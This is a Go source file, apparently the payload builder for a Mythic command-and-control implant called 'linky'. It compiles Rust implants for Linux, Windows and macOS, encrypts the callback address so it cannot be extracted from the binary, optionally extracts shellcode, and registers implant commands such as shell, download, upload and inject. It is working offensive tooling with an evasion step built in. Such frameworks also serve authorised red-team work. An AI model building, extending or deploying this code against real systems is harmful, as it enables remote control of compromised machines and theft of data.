package agent_functions

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/google/uuid"
)

// Build is called by Mythic each time an operator generates a new payload.
// It receives build parameters and the payload UUID/key from Mythic, compiles
// the Rust implant, and returns the binary bytes.
func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	resp := agentstructs.PayloadBuildResponse{
		PayloadUUID: input.PayloadUUID,
		Success:     false,
	}

	// Extract build parameters
	targetOS, _ := input.BuildParameters.GetStringArg("target_os")
	shellcode, _ := input.BuildParameters.GetBooleanArg("shellcode")
	debug, _ := input.BuildParameters.GetBooleanArg("debug")

	// payloadUUID is the 36-char UUID string baked into the implant for checkin.
	// aesKey is the 32-char hex of the 16-byte UUID used as IMPLANT_SECRET.
	parsedUUID, err := uuid.Parse(input.PayloadUUID)
	if err != nil {
		resp.BuildStdErr = fmt.Sprintf("invalid PayloadUUID: %v", err)
		return resp
	}
	payloadUUID := input.PayloadUUID
	aesKey := hex.EncodeToString(parsedUUID[:])

	// The callback host/port come from the C2 profile parameters.
	// Strip the scheme from callback_host: Mythic returns "https://host", the implant
	// reconstructs the full URL — storing the scheme twice produces an invalid URL (BUG-02).
	var callbackHost string
	if len(input.C2Profiles) > 0 {
		c2 := input.C2Profiles[0]
		host, _ := c2.GetArg("callback_host")
		port, _ := c2.GetArg("callback_port")
		hostStr := strings.TrimPrefix(fmt.Sprintf("%v", host), "https://")
		hostStr = strings.TrimPrefix(hostStr, "http://")
		callbackHost = fmt.Sprintf("%s:%v", hostStr, port)
	}

	callbackURI, _ := input.BuildParameters.GetStringArg("callback_uri")
	if callbackURI == "" {
		callbackURI = "/"
	}

	// Encrypt the callback address so it cannot be extracted as plaintext from the binary.
	encryptedCallback := encryptCallback(callbackHost, aesKey)

	// When running inside the official Docker container the agent code lives
	// at /Mythic/agent_code.  For local/dev runs an AGENT_CODE_DIR env var
	// can override the path.
	agentDir := os.Getenv("AGENT_CODE_DIR")
	if agentDir == "" {
		agentDir = "/Mythic/agent_code"
	}
	var (
		crateDir  string
		target    string
		binName   string
		outputExt string
	)

	switch targetOS {
	case "linux":
		crateDir = filepath.Join(agentDir, "links/linux")
		target = "x86_64-unknown-linux-musl"
		binName = "link-linux"
		outputExt = ""
	case "windows":
		crateDir = filepath.Join(agentDir, "links/windows")
		target = "x86_64-pc-windows-gnu"
		binName = "link-windows"
		outputExt = ".exe"
	case "macos":
		crateDir = filepath.Join(agentDir, "links/osx")
		target = "x86_64-apple-darwin"
		binName = "link-osx"
		outputExt = ""
	default:
		resp.BuildStdErr = fmt.Sprintf("unknown target_os: %s", targetOS)
		return resp
	}

	profile := "release"
	if debug {
		profile = "dev"
	} else if shellcode && targetOS == "linux" {
		profile = "release-shellcode"
	}

	args := []string{
		"build",
		"--profile", profile,
		"--target", target,
		"--quiet",
	}
	cmd := exec.Command("cargo", args...)
	cmd.Dir = crateDir
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("CALLBACK=%s", encryptedCallback),
		fmt.Sprintf("IMPLANT_SECRET=%s", aesKey),
		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
		fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
	)

	out, err := cmd.CombinedOutput()
	if err != nil {
		resp.BuildStdErr = fmt.Sprintf("cargo build failed:\n%s", string(out))
		resp.BuildStdOut = string(out)
		return resp
	}
	resp.BuildStdOut = string(out)

	// Locate the compiled binary.
	// cargo puts debug builds in target/<target>/debug/, not target/<target>/dev/ (BUG-07).
	outputProfile := profile
	if profile == "dev" {
		outputProfile = "debug"
	}
	// In a Cargo workspace the target/ directory lives at the workspace root
	// (agentDir), not inside each individual crate directory.
	binaryPath := filepath.Join(agentDir, "target", target, outputProfile, binName+outputExt)

	if shellcode && (targetOS == "linux" || targetOS == "macos") {
		scPath := binaryPath + ".bin"
		objcopy := exec.Command("objcopy", "-O", "binary", "--only-section=.text", binaryPath, scPath)
		if objcopyOut, err := objcopy.CombinedOutput(); err != nil {
			resp.BuildStdErr = fmt.Sprintf("objcopy failed: %s\n%s", err, string(objcopyOut))
			return resp
		}
		binaryPath = scPath
	}

	data, err := os.ReadFile(binaryPath)
	if err != nil {
		resp.BuildStdErr = fmt.Sprintf("failed to read binary at %s: %v", binaryPath, err)
		return resp
	}

	resp.Payload = &data
	resp.Success = true
	resp.BuildMessage = fmt.Sprintf("linky built for %s (%d bytes)", targetOS, len(data))
	return resp
}

// encryptCallback encrypts the C2 callback address so it cannot be extracted
// as a plaintext string from the compiled binary.
// Output format: hex(nonce_12 || ciphertext) — must match Rust decrypt_config().
func encryptCallback(callback, secret string) string {
	// derive_key: SHA-256(secret || "mythic-salt") — mirrors Rust derive_key()
	h := sha256.New()
	h.Write([]byte(secret))
	h.Write([]byte("mythic-salt"))
	key := h.Sum(nil) // 32 bytes

	block, err := aes.NewCipher(key)
	if err != nil {
		return callback // fallback to plaintext if crypto fails
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return callback
	}

	nonce := make([]byte, gcm.NonceSize()) // 12 bytes
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return callback
	}

	ct := gcm.Seal(nil, nonce, []byte(callback), nil)
	blob := append(nonce, ct...)
	return hex.EncodeToString(blob)
}

// RegisterAllCommands registers every linky command with the Mythic container.
func RegisterAllCommands() {
	registerShell()
	registerLs()
	registerCd()
	registerPwd()
	registerWhoami()
	registerPid()
	registerInfo()
	registerPs()
	registerNetstat()
	registerDownload()
	registerUpload()
	registerSleep()
	registerKilldate()
	registerInject()
	registerIntegrity()
	registerExit()
}
